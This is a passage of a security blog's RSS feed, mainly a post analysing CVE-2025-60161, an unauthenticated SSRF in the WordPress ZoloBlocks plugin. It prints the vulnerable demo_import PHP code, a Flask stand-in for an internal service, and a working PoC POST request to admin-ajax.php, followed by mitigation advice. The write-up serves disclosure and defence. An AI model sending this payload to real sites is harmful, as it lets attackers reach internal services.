&lt;code&gt;esc_url_raw()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/post-and-page-builder/vulnerability/wordpress-post-and-page-builder-by-boldgrid-visual-drag-and-drop-editor-plugin-1-27-8-server-side-request-forgery-ssrf-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin &amp;lt;= 1.27.8 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-60161 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-31-cve-2025-60161/</link>
      <pubDate>Fri, 31 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-31-cve-2025-60161/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-31-cve-2025-60161/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;A Server-Side Request Forgery (SSRF) vulnerability in BdThemes ZoloBlocks allows an attacker to make forged requests from the server. This issue affects ZoloBlocks versions from an unspecified initial version up to 2.3.11.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-60161&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-60161&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.3.11&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.3.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/zoloblocks/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ZoloBlocks Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;ZoloBlocks&lt;/strong&gt;: &lt;strong&gt;2.3.11&lt;/strong&gt; (vulnerable) and &lt;strong&gt;2.3.12&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to inspect differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The vulnerability existed in the file &lt;code&gt;TemplatesV1.php&lt;/code&gt;, however this file was removed in the patched release.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-31-cve-2025-60161/removed.png&#34; title=&#34;TemplatesV1.php was removed in the patch&#34; data-thumbnail=&#34;/posts/2025-10-31-cve-2025-60161/removed.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;TemplatesV1.php was removed in the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-31-cve-2025-60161/removed.png&#39; alt=&#34;Diff&#34; height=&#34;466&#34; width=&#34;1550&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;TemplatesV1.php was removed in the patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function demo_import() {&#xA;    // Check input parameter from POST&#xA;    if (!isset($_POST[&amp;#39;json_file_url&amp;#39;])) {&#xA;        wp_send_json_error(&amp;#39;No JSON file URL provided&amp;#39;);&#xA;        return;&#xA;    }&#xA;&#xA;    // Retrieve and sanitize the user-provided URL&#xA;    $json_file_url = sanitize_text_field(wp_unslash($_POST[&amp;#39;json_file_url&amp;#39;]));&#xA;&#xA;    // Send an HTTP request to that URL&#xA;    $response = wp_remote_get($json_file_url, [&amp;#39;timeout&amp;#39; =&amp;gt; 30]);&#xA;&#xA;    // If there&amp;#39;s an error when fetching data, return a JSON error&#xA;    if (is_wp_error($response)) {&#xA;        wp_send_json_error(&amp;#39;Failed to fetch JSON data&amp;#39;);&#xA;        return;&#xA;    }&#xA;&#xA;    // Retrieve the response body and decode the JSON&#xA;    $body    = wp_remote_retrieve_body($response);&#xA;    $data    = json_decode($body, true);&#xA;    $content = $data[&amp;#39;content&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;&#xA;    // Return a successful JSON response including the imported content&#xA;    wp_send_json_success([&#xA;        &amp;#39;status&amp;#39;   =&amp;gt; &amp;#39;success&amp;#39;,&#xA;        &amp;#39;message&amp;#39;  =&amp;gt; __(&amp;#39;Pattern imported successfully!&amp;#39;, &amp;#39;zoloblocks&amp;#39;),&#xA;        &amp;#39;content&amp;#39;  =&amp;gt; $content,&#xA;    ]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;The &lt;code&gt;demo_import()&lt;/code&gt; function accepts a URL from the user → issues an HTTP request (&lt;code&gt;wp_remote_get&lt;/code&gt;) to fetch JSON → decodes it and returns the result via &lt;code&gt;wp_send_json_success()&lt;/code&gt;.&#xA;Because it does not validate or restrict the URL, it can be abused to cause &lt;strong&gt;SSRF&lt;/strong&gt;.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;The &lt;code&gt;demo_import()&lt;/code&gt; function is registered as a callback for an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_zolo_demo_import&amp;#39;, [$this, &amp;#39;demo_import&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; hook is used for &lt;strong&gt;unauthenticated users&lt;/strong&gt; (anonymous users).&lt;/li&gt;&#xA;&lt;li&gt;When a client sends an AJAX request to the endpoint &lt;code&gt;admin-ajax.php?action=zolo_demo_import&lt;/code&gt;, WordPress will invoke the &lt;code&gt;demo_import()&lt;/code&gt; function.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;admin-ajax.php?action=zolo_demo_import&amp;#34;] --&amp;gt; B[&amp;#34;wp_ajax_nopriv_zolo_demo_import&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;demo_import()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;sanitize_text_field()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;wp_remote_get(json_file_url)&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;is_wp_error(response)?&amp;#34;}&#xA;F -- Yes --&amp;gt; G[&amp;#34;wp_send_json_error()&amp;#34;]&#xA;F -- No --&amp;gt; H[&amp;#34;json_decode(body) → extract URLs&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;wp_send_json_success()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service using Python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a POST request with the URL pointing to the local service:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;action=zolo_demo_import&amp;amp;json_file_url=http://127.0.0.1:8001/metadata&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-31-cve-2025-60161/result.png&#34; title=&#34;Content read from the local service&#34; data-thumbnail=&#34;/posts/2025-10-31-cve-2025-60161/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Content read from the local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-31-cve-2025-60161/result.png&#39; alt=&#34;Result&#34; height=&#34;486&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content read from the local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-60161 is an SSRF in &lt;code&gt;demo_import()&lt;/code&gt; of ZoloBlocks (≤ 2.3.11) caused by accepting a user-supplied URL and calling &lt;code&gt;wp_remote_get()&lt;/code&gt; without validation. The endpoint allows unauthenticated access (&lt;code&gt;wp_ajax_nopriv_...&lt;/code&gt;). The issue has been patched in &lt;strong&gt;2.3.12&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Root cause: not validating/whitelisting the URL before calling &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Impact: sites running ZoloBlocks ≤ 2.3.11; an attacker can query internal services (SSRF).&lt;/li&gt;&#xA;&lt;li&gt;Quick mitigation: update to &lt;strong&gt;2.3.12&lt;/strong&gt; or block the &lt;code&gt;zolo_demo_import&lt;/code&gt; endpoint.&lt;/li&gt;&#xA;&lt;li&gt;Prevention: whitelist/validate URLs, limit egress, protect AJAX actions with nonces/permissions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 